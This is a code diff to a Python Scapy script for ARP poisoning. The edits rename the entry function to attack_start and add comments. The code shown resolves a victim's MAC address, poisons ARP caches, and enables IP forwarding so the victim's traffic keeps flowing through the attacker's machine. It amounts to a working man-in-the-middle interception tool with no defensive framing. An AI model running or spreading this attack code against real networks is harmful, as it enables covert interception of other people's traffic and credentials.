@@ -2,10 +2,8 @@ import time, scapy, threading
 from scapy.all import *
 from scapy.layers.l2 import ARP, Ether
 
-def main():
+def attack_start():
     target_IP = input ("Input target IP address: ")
-    #router_IP = input("Enter Router IP address: ")
-    #inface = input("Enter Interface name to operate on: ")
 
     target_mac = get_mac(target_IP)
 
@@ -32,11 +30,13 @@ def arp_poison(target_IP, gateway_ip, target_mac, gateway_mac):
         restore_session(target_IP, gateway_ip, target_mac, gateway_mac)
         print("Stopping")
 
+#Get MAC address of victim's machine
 def get_mac(target_IP):
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP (pdst=target_IP), timeout=2, retry = 10)
     for sent, rcv in ans:
         return rcv.hwsrc
 
+#Enable packet forwarding so victim's traffic will continue to travel
 def packet_forward():
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
